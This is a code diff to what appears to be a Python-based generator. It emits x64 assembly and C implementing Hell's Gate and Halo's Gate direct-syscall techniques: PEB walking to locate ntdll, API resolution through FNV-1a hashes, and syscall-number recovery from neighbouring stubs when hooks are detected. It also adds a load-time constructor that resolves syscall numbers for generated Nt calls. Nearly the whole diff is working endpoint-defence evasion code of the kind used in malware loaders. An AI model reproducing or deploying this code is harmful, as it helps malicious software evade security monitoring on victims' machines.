@@ -33,11 +33,8 @@ global halosGateUp
 global halosGateDown
 global HellsGate
 global HellDescent
-global compExplorer
-
 
 getntdll:
-    push rbx
     xor rax, rax                ; zero RAX only, no RDI involved
     mov rcx, [gs:rax+60h]       ; PEB
     mov rcx, [rcx+18h]          ; PEB->Ldr
@@ -45,7 +42,6 @@ getntdll:
     mov rcx, [rcx]              ; second entry (ntdll)
     mov rcx, [rcx+20h]          ; DllBase
     mov rax, rcx
-    pop rbx
     ret
 
 
@@ -78,7 +74,6 @@ getExAddressTable:
     pop rbx
 	ret                     ; return to caller
 
-
 ; Get &module.NamePointerTable from &module.ExportTable
 getExNamePointerTable:
     push rbx
@@ -108,66 +103,53 @@ getExOrdinalTable:
 getApiAddr:
 	mov r10, r9             ; R10 = &module.ExportTable.AddressTable
 	mov r11, [rsp+28h]      ; R11 = &module.ExportTable.NamePointerTable
-	mov r12, [rsp+30h]      ; R12 = &module.ExportTable.OrdinalTable
-	xor rax, rax            ; Setup Counter for resolving the API Address after finding the name string
-	push rcx                ; push the string length counter to stack
+	mov r9, [rsp+30h]       ; R9  = &OrdinalTable (r9 is free after the copy)
+	xor rax, rax            ; RAX = name index counter
 	jmp short getApiAddrLoop
 
 getApiAddrLoop:
-	mov rcx, [rsp]          ; reset the string length counter from the stack
-	xor rdi, rdi            ; Clear RDI for setting up string name retrieval
-	mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
-	add rdi, r8             ; RDI = &NameString    = RVA NameString + &module.dll
-	mov rsi, rdx            ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
-    
-    push rax;
-    push rcx;
-    push rdx;
+	mov ecx, [r11+rax*4]    ; ECX = RVA NameString (rcx is free scratch)
+	add rcx, r8             ; RCX = &NameString
+
+	push rax                ; hash loop clobbers eax
+	push rdx                ; hash loop clobbers rdx
+
+	mov eax, 0x811C9DC5     ; FNV-1a offset basis
+	mov rdx, rcx
 
 hash_compare:
-    mov eax, 0x811C9DC5
-    mov rdx, rdi
+	movzx ecx, byte [rdx]
+	test ecx, ecx
+	jz hash_done
+	xor eax, ecx
+	imul eax, eax, 0x01000193
+	inc rdx
+	jmp short hash_compare
 
-.loop:
-    movzx ecx, byte [rdx]
-    test ecx, ecx
-    jz .done
+hash_done:
+	pop rdx                 ; restore hash param
+	cmp eax, edx            ; match?
+	pop rax                 ; restore counter (pop doesn't touch flags)
+	je getApiAddrFin
 
-    xor eax, ecx
-    imul eax, eax, 0x01000193
-    inc rdx
-    jmp .loop
-
-.done:
-    cmp eax, esi
-    pop rdx;
-    pop rcx;
-    pop rax;
-    je getApiAddrFin
-    
 	inc rax
 	jmp short getApiAddrLoop
 
-; Find the address of GetProcAddress by using the last value of the Counter
 getApiAddrFin:
-	pop rcx                 ; remove string length counter from top of stack
-	mov ax, [r12+rax*2]     ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
-	mov eax, [r10+rax*4]    ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
-	add rax, r8             ; RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
-	ret                     ; return to API caller
+	movzx eax, word [r9+rax*2]  ; EAX = ordinal (movzx clears upper bits too)
+	mov eax, [r10+rax*4]         ; EAX = RVA of API
+	add rax, r8                 ; RAX = &module.API
+	ret
 
 ; Find the syscall number for the NTDLL API with provided API address
 ; RCX = NTDLL.<API> Address
 findSyscallNumber:
-	xor rsi, rsi
-	xor rdi, rdi 
-	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
-	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub (mov r10,rcx;mov eax,<syscall#>)
-	cmp rsi, rdi
-	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
-	xor rax,rax            ; clear RAX as it will hold the syscall
-	mov ax, [rcx+4]        ; The systemcall number
-	ret                    ; return to caller
+	mov r10d, 00B8D18B4Ch    ; "4C 8B D1 B8" = mov r10,rcx ; mov eax,...
+	mov r11d, [rcx]
+	cmp r10d, r11d
+	jne error
+	movzx eax, word [rcx+4]
+	ret
 
 ; RCX = &NTDLL.<API> | RDX = 32bytes * Up Increment 
 halosGateUp:
@@ -232,7 +214,7 @@ HellDescent:
         ntdll = []
         codeblock = ''
         for apicall in self.apicalls:
-            if apicall[0:2] == ['Nt']:
+            if apicall[0:2] == 'Nt':
                 ntdll.append(apicall)
             elif apicall[0:2] in ['Zw', 'Rt']:
                 codeblock += f"""
@@ -277,30 +259,60 @@ EXTERN_C DWORD findSyscallNumber(
 	IN PVOID ntdllApiAddr
 );
 
-EXTERN_C DWORD halosGate(
+EXTERN_C DWORD halosGateUp(
 	IN PVOID ntdllApiAddr,
 	IN WORD index
 );
 
-EXTERN_C DWORD compExplorer(
-	IN PVOID explorerWString
+EXTERN_C DWORD halosGateDown(
+	IN PVOID ntdllApiAddr,
+	IN WORD index
 );
 
-PVOID ntdll = NULL;
-PVOID ntdllExportTable = NULL;
+typedef struct {{
+    {'\n\t'.join([f'DWORD {x}_ssn;' for x in ntdll ])}
+}} Resolver;
 
-PVOID ntdllExAddrTbl = NULL;
-PVOID ntdllExNamePtrTbl = NULL;
-PVOID ntdllExOrdinalTbl = NULL;
+Resolver resolver;
+
+DWORD halosGate(PVOID apiAddr){{
+	DWORD syscallNumber = 0;
+	syscallNumber = findSyscallNumber(apiAddr);
+	if (syscallNumber == 0){{
+		DWORD index = 0;
+        while (syscallNumber == 0){{
+			index++;
+			syscallNumber = halosGateUp(apiAddr, index);
+			if (syscallNumber){{
+				syscallNumber = syscallNumber - index;
+				break;
+			}}
+			syscallNumber = halosGateDown(apiAddr, index);
+			if (syscallNumber){{
+				syscallNumber = syscallNumber - index;
+				break;
+			}}    
+		}}  
+	}}
+	return syscallNumber;
+    
+}}
 
 __attribute__((constructor)) void {self.name}(){{
+
+	PVOID ntdll = NULL;
+	PVOID ntdllExportTable = NULL;
+
+	PVOID ntdllExAddrTbl = NULL;
+	PVOID ntdllExNamePtrTbl = NULL;
+	PVOID ntdllExOrdinalTbl = NULL;
 
     ntdll = getntdll();
     ntdllExportTable = getExportTable(ntdll);
     ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdll);
     ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdll);
     ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdll);
-    Sleep(0);
+    {'\n\t'.join([f'resolver.{apicall}_ssn = halosGate(getApiAddr({len(apicall)}, {self.hashstring(apicall)}, ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));' for apicall in ntdll])}
 }}
 """
         return codeblock
@@ -312,8 +324,7 @@ __attribute__((constructor)) void {self.name}(){{
         for apicall in apicalls:
             if apicall[0:2] == 'Nt':
                 resolved[apicall] = f"""
-    DWORD {apicall}_ssn = findSyscallNumber(getApiAddr({len(apicall)}, {self.hashstring(apicall)}, ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));
-    HellsGate({apicall}_ssn);
+	HellsGate(resolver.{apicall}_ssn);
     HellDescent"""
             elif apicall[0:2] in ['Rt', 'Zw']:
                 resolved[apicall] = f'(({apicall}_t)GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "{apicall}"))'
